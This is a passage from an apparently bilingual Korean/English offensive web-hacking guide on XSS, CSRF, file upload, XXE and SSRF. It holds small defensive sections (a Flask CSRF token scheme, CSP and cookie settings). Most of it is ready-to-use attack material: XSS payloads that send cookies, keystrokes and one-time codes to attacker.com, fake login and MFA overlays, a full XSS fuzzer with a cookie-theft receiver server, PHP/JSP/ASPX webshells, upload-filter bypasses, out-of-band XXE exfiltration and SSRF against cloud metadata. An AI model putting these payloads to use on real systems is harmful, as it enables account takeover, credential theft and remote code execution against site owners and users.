if __name__ == "__main__":
    main()
```

### CSRF 방어 구현


CSRF(Cross-Site Request Forgery)는 피해자의 인증 상태를 악용하여 의도치 않은 요청을 보내는 공격입니다. 피해자가 로그인된 상태에서 공격자가 만든 페이지를 방문하면, 피해자의 권한으로 서버에 요청이 전송됩니다.

```python
#!/usr/bin/env python3
"""
Flask CSRF 방어 구현 — Synchronizer Token Pattern + SameSite 쿠키
"""
import secrets
import hashlib
import hmac
import time
from flask import Flask, request, session, abort, render_template_string, jsonify
from functools import wraps
from typing import Optional

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # 강력한 랜덤 비밀키 필수

CSRF_TOKEN_LIFETIME = 3600  # 1시간


def generate_csrf_token() -> str:
    """암호학적으로 안전한 CSRF 토큰 생성"""
    raw = secrets.token_urlsafe(32)
    timestamp = int(time.time())
    # HMAC으로 서명 → 위조 불가
    sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{timestamp}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return f"{raw}:{timestamp}:{sig}"


def validate_csrf_token(token: Optional[str]) -> bool:
    """CSRF 토큰 검증 (서명 + 만료 시간)"""
    if not token:
        return False
    try:
        raw, ts_str, sig = token.split(":", 2)
    except ValueError:
        return False

    timestamp = int(ts_str)
    if time.time() - timestamp > CSRF_TOKEN_LIFETIME:
        return False  # 만료

    expected_sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{ts_str}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return hmac.compare_digest(sig, expected_sig)  # 타이밍 공격 방지


def csrf_protect(f):
    """CSRF 보호 데코레이터 — POST/PUT/DELETE 요청 검증"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ("POST", "PUT", "PATCH", "DELETE"):
            token = (
                request.form.get("csrf_token")
                or request.headers.get("X-CSRF-Token")
                or request.json.get("csrf_token") if request.is_json else None
            )
            if not validate_csrf_token(token):
                abort(403, "CSRF 토큰이 유효하지 않습니다")
        return f(*args, **kwargs)
    return decorated


@app.route("/api/token", methods=["GET"])
def get_csrf_token():
    token = generate_csrf_token()
    session["csrf_token"] = token
    resp = jsonify({"csrf_token": token})
    # SameSite=Strict으로 추가 방어
    resp.set_cookie("csrf_token", token, httponly=False,
                    samesite="Strict", secure=True)
    return resp


@app.route("/api/change-password", methods=["POST"])
@csrf_protect
def change_password():
    new_pw = request.json.get("new_password", "")
    if len(new_pw) < 8:
        abort(400, "비밀번호는 8자 이상이어야 합니다")
    # 실제 로직...
    return jsonify({"status": "success"})
```

---

## 7. XSS를 이용한 MFA 우회

### 원리
```
MFA (2단계 인증)가 설정된 계정도 XSS로 우회 가능
→ XSS가 피해자 브라우저에서 실행되므로 세션이 이미 인증된 상태

공격 흐름:
1. 피해자가 MFA를 완료하고 로그인 성공
2. 저장형 XSS 페이로드가 피해자 브라우저에서 실행
3. 이미 인증된 세션(쿠키)을 공격자에게 전송
4. 공격자가 세션 쿠키로 직접 접근 (MFA 단계 건너뜀)
```

### MFA 우회 XSS 시나리오

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```javascript
// 시나리오 1: 세션 쿠키 탈취 (HttpOnly 없을 때)
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// 시나리오 2: TOTP 코드 자동 캡처 (입력 폼이 있는 경우)
<script>
  document.getElementById('totp-input').addEventListener('input', function(e) {
    fetch('https://attacker.com/totp?code=' + e.target.value);
  });
</script>

// 시나리오 3: 가짜 MFA 팝업으로 피싱
<script>
  var overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">
      <div style="background:white;margin:20% auto;padding:30px;width:300px;text-align:center">
        <h3>보안 인증</h3>
        <p>OTP 코드를 입력하세요</p>
        <input id="fake-otp" type="text">
        <button onclick="steal()">확인</button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  
  function steal() {
    var code = document.getElementById('fake-otp').value;
    fetch('https://attacker.com/mfa?code=' + code);
  }
</script>

// 시나리오 4: 비밀번호 변경 (CSRF + XSS 연계)
<script>
  // XSS로 CSRF 토큰 획득 후 비밀번호 변경
  fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
      var token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
      return fetch('/account/change-password', {
        method: 'POST',
        body: 'csrf_token=' + token + '&new_password=hacked123',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
      });
    });
</script>
```

---

## 8. 컨텍스트별 XSS 인코딩 전략

### 삽입 위치에 따른 공격 방법
```html
<!-- 1. HTML 요소 컨텍스트 -->
<div>사용자입력</div>
공격: <script>alert(1)</script>
방어: HTML 엔티티 인코딩 (&lt; &gt; &amp;)

<!-- 2. HTML 속성 컨텍스트 -->
<input value="사용자입력">
공격: " onmouseover="alert(1)
방어: 속성값 따옴표 필수 + " → &quot; 인코딩

<!-- 3. JavaScript 컨텍스트 -->
<script>var x = '사용자입력'</script>
공격: '; alert(1); var y='
방어: JSON.stringify() + ' → \x27

<!-- 4. URL 컨텍스트 -->
<a href="사용자입력">
공격: javascript:alert(1)
방어: URL 스킴 화이트리스트 (http/https만 허용)

<!-- 5. CSS 컨텍스트 -->
<div style="color: 사용자입력">
공격: expression(alert(1))  (IE), url('javascript:...')
방어: CSS 파서 통한 값 검증

<!-- 6. JSON 응답에서 -->
{"message": "사용자입력"}
→ HTML 렌더링 시 DOM XSS 가능
방어: JSON response에도 HTML 인코딩
```

### 트로이 목마 로그인 패널 (Login Defacement)
```javascript
// 실제 로그인 폼을 공격자 서버로 제출하도록 변조
<script>
  // 정상 폼의 action 속성 변경
  var loginForm = document.querySelector('form[action*="login"]');
  if (loginForm) {
    loginForm.action = 'https://attacker.com/capture';
  }
  
  // 또는 전체 페이지 교체
  document.body.innerHTML = `
    <form method="POST" action="https://attacker.com/steal">
      <input name="username" placeholder="아이디">
      <input name="password" type="password" placeholder="비밀번호">
      <button>로그인</button>
    </form>`;
</script>
```

---

## 9. XXE 심화 (Billion Laughs + SAML 공격)

### Billion Laughs DoS 변형

XML Billion Laughs 공격(XML 폭탄)입니다. 중첩된 엔티티 참조로 메모리를 기하급수적으로 소진시켜 DoS를 유발합니다.

```xml
<!-- 지수적 확장 공격 -->
<?xml version="1.0"?>
<!DOCTYPE billion [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- 수백 바이트 -->
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">   <!-- 10배 -->
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">   <!-- 100배 -->
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">   <!-- 1000배 -->
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">   <!-- 10000배 -->
]>
<data>&e;</data>
<!-- 파서가 &e; 확장 시 수 GB 메모리 소비 → OOM 또는 CPU 100% -->
```

### SAML XXE — SSO 공격
```
SAML(Security Assertion Markup Language):
엔터프라이즈 SSO에 사용되는 XML 기반 인증 프로토콜

공격 흐름:
1. SP(Service Provider)에서 IdP로 인증 요청
2. IdP가 SAML Response (XML) 발행
3. SP로 SAML Response 전달 (Base64 인코딩)
4. ↑ 이 단계에서 중간자 공격 또는 클라이언트 측 변조

취약 시나리오:
```
```bash
# SAML Response 캡처 (Burp Suite)
# SAMLResponse= 파라미터 값 추출

# Base64 디코딩
echo "SAMLResponse값" | base64 -d > saml.xml

# XXE 페이로드 삽입
# <samlp:Response ...> 앞에 DOCTYPE 선언 추가
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# 다시 Base64 인코딩
cat saml_modified.xml | base64 -w0

# 변조된 SAMLResponse 전송 → 서버가 /etc/passwd를 SAML 처리 중 읽음
```

XML 데이터 예시입니다. XXE(XML External Entity) 인젝션은 XML 파서의 외부 엔티티 처리 기능을 악용하는 웹 취약점입니다.

```xml
<!-- 변조된 SAML Response -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>&xxe;</saml:Issuer>
  ...
</samlp:Response>
```

---

<!-- detect-validate-05 -->
## XSS/CSRF/업로드 탐지와 방어 검증

XSS·CSRF·파일 업로드 공격은 *어떻게 실행/위조/투입하는가*를 다루지만, 방어자는 **공격이 CSP 위반·토큰 부재·파일 시그니처 어디서 잡히는가**와 **출력 인코딩·CSRF 토큰·매직바이트 검증이 실제로 막는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 공격 | 노리는 계층 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 저장형/반사형 XSS | 출력 렌더링 | 출력 인코딩, CSP | CSP 위반 리포트, `<script>` 류 입력 |
| DOM XSS | 클라이언트 싱크 | 안전 DOM API, Trusted Types | `innerHTML`/`eval` 싱크 사용 |
| CSRF | 상태변경 요청 | CSRF 토큰, SameSite | 토큰 부재 POST, 외부 Referer |
| 악성 파일 업로드 | 콘텐츠 처리 | 매직바이트·확장자 검증 | content-type 불일치, 웹셸 시그니처 |

### 방어 검증 (직접 확인)

```bash
# 1) CSP 헤더가 실제 전송되는지 사실 확인(소유 서버) — 없으면 XSS 완화 부재
curl -sI https://localhost/ | grep -i 'content-security-policy' || echo 'NO CSP HEADER'
# 2) 업로드 파일을 확장자가 아닌 매직바이트로 검증하는지 실측
file --mime-type uploaded.bin   # image/png 이라 주장해도 실제 타입 확인
# 3) 상태변경 폼에 CSRF 토큰이 포함되는지 점검
curl -s https://localhost/transfer | grep -iq 'csrf' && echo 'CSRF token present' || echo 'NO CSRF TOKEN'
```

> 검증은 **소유한 서버·통제 환경**에서만. "인코딩/토큰을 넣었다"와 "실제 페이로드를 막는다"는 다르다 — XSS/CSRF/웹셸 PoC 를 재현해 통제가 차단하는지 확인한다([[13_SOC_Blue_Team]], [[68_Purple_Team]]).

---

<a name="english"></a>

# XSS / CSRF / File Upload Vulnerabilities

## 1. XSS (Cross-Site Scripting)

### XSS Types

| Type | Persistence | Description |
|------|-------------|-------------|
| Stored XSS | Saved to DB | Permanently stored in boards, profiles, etc. → Most dangerous |
| Reflected XSS | Not saved | Injected into URL parameters → Phishing links |
| DOM-based XSS | Client-side | Occurs when JavaScript manipulates the DOM |

---

### 1-1. Stored XSS

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```html
<!-- Injected when posting to a bulletin board -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**Real Attack Scenarios:**
```javascript
// Cookie theft → Session hijacking
<script>
  new Image().src = "http://attacker.com/steal?c=" + document.cookie;
</script>

// Keylogger
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "http://attacker.com/key?k=" + e.key;
  });
</script>

// Credential phishing
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">'
    + '<input name="user" placeholder="Username">'
    + '<input name="pass" type="password" placeholder="Password">'
    + '<input type="submit"></form>';
</script>

// BeEF Hook (browser exploit)
<script src="http://attacker.com:3000/hook.js"></script>
```

---

### 1-2. Reflected XSS

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```
Vulnerable URL:
http://target.com/search?q=<script>alert(1)</script>

Phishing link:
http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**URL-encoded payload:**
```
http://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

### 1-3. DOM-based XSS

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```javascript
// Vulnerable code
var name = document.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// Attack URL
http://target.com/page#<img src=x onerror=alert(1)>

// Abusing location.href
document.write('<a href="' + location.href + '">link</a>');
// Attack: inject javascript:alert(1)
```

---

### 1-4. XSS Filter Bypass

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```html
<!-- Tag filter bypass -->
<ScRiPt>alert(1)</ScRiPt>                 (mixed case)
<scr<script>ipt>alert(1)</scr</script>ipt>   (double injection)
<img src=1 onerror=alert(1)>              (event handler)
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>

<!-- Without quotes -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>             (backtick)

<!-- Whitespace bypass -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">

<!-- Protocol bypass -->
<a href="JaVaScRiPt:alert(1)">
<a href="java&#9;script:alert(1)">    (tab character)
<a href="java&#10;script:alert(1)">   (newline)

<!-- CSP bypass (using JSONP endpoints) -->
<script src="https://trusted.com/api?callback=alert(1)"></script>

<!-- Script inside SVG -->
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>

<!-- Encoding bypass -->
<script>alert(1)</script>   (Unicode)
```

---

### 1-5. Building an XSS Cookie Theft Server

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```python
#!/usr/bin/env python3
"""
XSS payload fuzzer + cookie theft receiver server
Fuzzer: injects payloads into each parameter using requests to check reflection
Receiver server: logs stolen cookies/data

Usage:
  # Fuzzer mode
  python3 xss_fuzzer.py fuzz -u "http://target.com/search?q=test"
  # Receiver server mode
  python3 xss_fuzzer.py server --port 8080
"""
import argparse
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote

import requests


# ── XSS payload list (including filter bypasses) ──────────────────────────────
XSS_PAYLOADS: list[str] = [
    # Basic detection markers (check if reflected)
    "<xss>",
    "\"'><xss>",
    "</script><xss>",

    # Actual execution payloads
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",

    # Event handlers (bypass script tag filters)
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",

    # Mixed case bypass
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",

    # JavaScript protocol
    "<a href=\"javascript:alert(1)\">click</a>",
    "<iframe src=\"javascript:alert(1)\">",

    # Encoding bypass
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",

    # DOM sink tests
    "javascript:alert(1)",
    "';alert(1);//",
    "\";alert(1);//",

    # CSP bypass (environments without nonce)
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
]

STEAL_TEMPLATE = (
    "<script>"
    "fetch('http://ATTACKER_HOST/steal?c='+encodeURIComponent(document.cookie))"
    "</script>"
)


# ── Fuzzer ────────────────────────────────────────────────────────────────────
class XSSFuzzer:
    def __init__(
        self,
        url: str,
        post_data: Optional[str] = None,
        cookies: Optional[str] = None,
        attacker_host: str = "attacker.com",
        delay: float = 0.2,
    ) -> None:
        self.url = url
        self.post_data = post_data
        self.method = "POST" if post_data else "GET"
        self.attacker_host = attacker_host
        self.delay = delay

        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (XSS-Fuzzer/2.0)"
        if cookies:
            for item in cookies.split(";"):
                k, _, v = item.strip().partition("=")
                self.session.cookies.set(k.strip(), v.strip())

        parsed = urlparse(url)
        self.base_params = (
            {k: v[0] for k, v in parse_qs(parsed.query).items()}
            if self.method == "GET"
            else {pair.split("=")[0]: pair.split("=")[1]
                  for pair in post_data.split("&") if "=" in pair}
        )

    def _send(self, params: dict) -> Optional[requests.Response]:
        try:
            if self.method == "GET":
                return self.session.get(self.url, params=params, timeout=10)
            else:
                return self.session.post(self.url, data=params, timeout=10)
        except requests.RequestException:
            return None

    def _is_reflected(self, resp: Optional[requests.Response], marker: str) -> bool:
        if resp is None:
            return False
        return marker.lower() in resp.text.lower()

    def fuzz(self) -> list[dict]:
        findings = []
        for param in self.base_params:
            print(f"[*] Parameter: {param}")
            for payload in XSS_PAYLOADS:
                params = {**self.base_params, param: payload}
                resp = self._send(params)
                # Check for reflection (marker detection)
                marker = "<xss>" if "<xss>" in payload else payload[:10]
                if self._is_reflected(resp, marker):
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "status": resp.status_code if resp else None,
                        "url": self.url,
                    })
                    print(f"  [!] Reflection found! payload: {payload!r}")
                time.sleep(self.delay)
        return findings


# ── Receiver server ───────────────────────────────────────────────────────────
LOG_FILE = Path("xss_captured.log")

class XSSReceiverHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        captured = {}
        for key in ("c", "cookie", "k", "key", "data", "token"):
            if key in params:
                captured[key] = params[key][0]

        if captured:
            line = f"[{timestamp}] {client_ip}  {captured}\n"
            print(f"[+] Data received: {line}", end="")
            with LOG_FILE.open("a") as f:
                f.write(line)

        # Allow CORS + transparent 1px image response (prevent browser errors)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
                         b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
                         b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
                         b"\x44\x01\x00\x3b")

    def log_message(self, fmt: str, *args) -> None:
        pass  # Suppress default log output


def run_server(host: str = "0.0.0.0", port: int = 8080) -> None:
    server = HTTPServer((host, port), XSSReceiverHandler)
    print(f"[*] XSS receiver server started: http://{host}:{port}")
    print(f"[*] Capture log: {LOG_FILE.resolve()}")
    print(f"[*] XSS payload: {STEAL_TEMPLATE.replace('ATTACKER_HOST', f'YOUR_IP:{port}')}")
    server.serve_forever()


# ── CLI ───────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(description="XSS Fuzzer + Receiver Server")
    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="Run XSS fuzzing")
    fuzz_p.add_argument("-u", "--url", required=True)
    fuzz_p.add_argument("--post", help="POST data")
    fuzz_p.add_argument("--cookie", help="Cookie string")
    fuzz_p.add_argument("--delay", type=float, default=0.2)

    srv_p = sub.add_parser("server", help="Run receiver server")
    srv_p.add_argument("--port", type=int, default=8080)

    args = parser.parse_args()

    if args.cmd == "fuzz":
        fuzzer = XSSFuzzer(args.url, args.post, args.cookie, delay=args.delay)
        results = fuzzer.fuzz()
        print(f"\n[+] Total {len(results)} XSS reflection points found")
    else:
        run_server(port=args.port)


if __name__ == "__main__":
    main()
```

---

## 2. CSRF (Cross-Site Request Forgery)

### How It Works
```
1. Victim → Logs into banking site (session cookie issued)
2. Attacker → Crafts malicious page (inserts auto-request code)
3. Victim → Visits malicious page
4. Browser → Automatically sends request to bank with victim's cookie
5. Bank → Processes request as if it came from the victim
```

### CSRF Payloads

**GET-based CSRF:**
```html
<!-- Auto-request via image tag -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">

<!-- Using iframe -->
<iframe src="http://bank.com/delete_account" style="display:none">
```

**POST-based CSRF:**
```html
<!-- Auto-submitting form -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**JSON CSRF (Content-Type bypass):**
```html
<!-- Mimicking JSON with application/x-www-form-urlencoded -->
<form action="http://api.target.com/user/update" method="POST"
      enctype="text/plain">
  <input name='{"admin":true,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF Token Bypass

CSRF (Cross-Site Request Forgery) exploits a victim's authenticated state to send unintended requests. When the victim visits a page crafted by an attacker while logged in, requests are sent to the server with the victim's privileges.

```
1. CSRF token not validated → Request without token
2. Token acquisition via same-site request (combined with XSS)
   - Read token value with XSS and include it in CSRF request
3. Referrer header bypass
   - Request without Referrer
   - Forge Referrer
4. Predictable token → Brute-force
```

---

## 3. File Upload Vulnerabilities

### Attack Objective
Upload a webshell (malicious script) to the server to achieve Remote Code Execution (RCE)

### 3-1. Basic Webshells

**PHP Webshell:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_POST['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>

<!-- More powerful webshell -->
<?php
$cmd = ($_REQUEST['cmd'] ?? '');
echo '<pre>' . shell_exec($cmd) . '</pre>';
?>
```

**JSP Webshell (Java server):**
```jsp
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

**ASPX Webshell (.NET server):**
```csharp
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

### 3-2. Extension Filter Bypass

**PHP alternative extensions:**
```
.php
.php3  .php4  .php5  .php7
.phtml  .pht  .shtml
.pHp  .PhP  (mixed case bypass)
.php.bak  (double extension)
```

**Server configuration abuse:**
```
.php%00.jpg     (Null byte — PHP 5.3 and below)
.php .jpg       (space + extension)
.php%20.jpg     (URL-encoded space)
shell.php;.jpg  (semicolon bypass — some Apache versions)
```

**Content-Type bypass:**
```
Tamper Content-Type: image/jpeg when uploading
Burp Suite Intercept → Modify Content-Type
```

**File signature bypass (Magic Bytes):**
```
Add image header before PHP code:
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

GIF header + PHP:
GIF89a<?php system($_GET['cmd']); ?>

Embed PHP code in actual image file (ExifTool):
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

### 3-3. Finding the Upload Path

```bash
# Guess access path after upload
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/media/shell.php
http://target.com/images/shell.php

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

### 3-4. LFI → File Upload Chaining (Log Poisoning)

```
1. Inject PHP code into web server log
   User-Agent: <?php system($_GET['cmd']); ?>

2. Execute log file via LFI
   http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
```

---

### 3-5. DOM-based XSS Sources and Sinks

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```
Sources — Points where attacker input enters:
  document.URL
  document.location.href
  document.location.search
  document.location.hash
  document.referrer
  window.name
  postMessage event data

Sinks — Dangerous functions that lead to execution:
  innerHTML, outerHTML        → HTML injection → XSS
  document.write()            → HTML injection → XSS
  eval()                      → JS execution
  setTimeout(string)          → JS execution
  setInterval(string)         → JS execution
  location.href = user_input  → javascript: protocol
  jQuery.html()               → Same as innerHTML

DOM XSS detection (Polyglot payload):
  javascript:/*--></title></style></textarea></script></xmp>
  <svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

Defense:
  - Use textContent / innerText (instead of innerHTML)
  - Sanitize HTML with DOMPurify library
  - Apply Trusted Types API (Chrome 75+)
```

### 3-6. File Upload Vulnerabilities — Additional Bug Bounty Techniques

```
Content-Type bypass (using Burp Suite Intercept):
  1. Select .php file
  2. Intercept request → Tamper Content-Type: image/jpeg
  3. Bypass if server only validates Content-Type

Double extension attack:
  shell.php.jpg  → Processed as PHP if Apache mod_mime is misconfigured
  shell.jpg.php  → Processed by last extension as executable

IIS vulnerability:
  shell.asp;.jpg → Processed as ASP in vulnerable IIS 6 versions

File signature manipulation (Magic Bytes):
  GIF89a<?php system($_GET['cmd']); ?>
  → File header is GIF, PHP code appended
  → Bypasses image validation libraries

Finding execution path after upload:
  ffuf -u http://target.com/uploads/FUZZ -w wordlist.txt
  gobuster dir -u http://target.com -w dirs.txt -x php
```

---

## 4. Other Major Web Vulnerabilities

### 4-1. Directory Traversal

```
http://target.com/download?file=../../../etc/passwd
http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/download?file=....//....//etc/passwd   (filter bypass)
http://target.com/download?file=%2Fetc%2Fpasswd

# Key target files
/etc/passwd          (user list)
/etc/shadow          (hashed passwords, requires root)
/etc/hosts
/etc/ssh/sshd_config
/var/log/apache2/access.log
/var/www/html/config.php
/proc/self/environ   (environment variables — PHP code injection possible)
```

### 4-2. SSRF (Server-Side Request Forgery)

```
# Internal network scanning
http://target.com/fetch?url=http://192.168.1.1/
http://target.com/fetch?url=http://127.0.0.1/admin

# Cloud metadata theft
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass
http://0.0.0.0/               (alternative to 127.0.0.1)
http://[::1]/                 (IPv6 loopback)
http://localhost.evil.com/    (DNS rebinding)
http://①②⑦.⓪.⓪.①/         (Unicode digits)

# SSRF → Internal service attack
http://target.com/fetch?url=dict://127.0.0.1:6379/   (Redis)
http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis command)
```

### 4-3. XXE (XML External Entity)

XXE (XML External Entity) injection exploits the external entity processing feature of XML parsers as a web vulnerability.

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Combined with SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<data>&xxe;</data>

<!-- External DTD file reference (Out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>

<!-- evil.dtd contents -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
```

---

## 5. Burp Suite Practical Usage

### Essential Features

```
1. Proxy (Intercept)
   - Intercept/modify HTTP/HTTPS traffic
   - Browser → Burp → Server

2. Repeater
   - Repeat and modify requests
   - Core tool for manual testing

3. Intruder (Automated attacks)
   - Sniper: Payload list against one parameter
   - Battering Ram: Same payload against all parameters
   - Pitchfork: Different payloads against multiple parameters
   - Cluster Bomb: All combinations (brute-force)

4. Scanner (Pro version)
   - Automated vulnerability scanning

5. Decoder
   - URL/Base64/HTML/Hex encoding/decoding

6. Comparer
   - Compare two responses (highlights differences)

7. Sequencer
   - Token randomness analysis (CSRF tokens, session IDs)
```

### Finding XSS with Burp

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```
1. Identify all input parameters via Proxy
2. Insert <xss> into each parameter in Repeater
3. If <xss> is returned as-is in response, XSS is possible
4. Try actual payloads (alert, cookie theft)
```

### Finding SQL Injection with Burp

SQL injection attacks databases by tampering with query structure when user input is directly inserted into SQL queries. `sqlmap` automates this from DB type detection to data dumping with a single command.

```
1. Insert ' into parameters in Repeater → Check for SQL errors
2. Compare responses: ' AND '1'='1 vs ' AND '1'='2
3. Integration with SQLMap: --proxy=http://127.0.0.1:8080
```

---

## 6. XSS Defense

### Output Encoding (Most Important)
```python
# Python (Flask)
from markupsafe import escape
safe_output = escape(user_input)

# HTML special character encoding
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### Content Security Policy (CSP)

```http
# Strictest CSP
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'

# Nonce-based (allows inline scripts)
Content-Security-Policy: script-src 'nonce-{random_value}'
<script nonce="{random_value}">/* Allowed script */</script>
```

### HttpOnly, Secure Cookies

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly  → Prevents JavaScript access to document.cookie (defends against XSS cookie theft)
Secure    → Cookie only transmitted over HTTPS
SameSite=Strict → Cookie not sent from external sites (CSRF defense)
```

### CSRF Token Theft PoC (XSS Chaining)

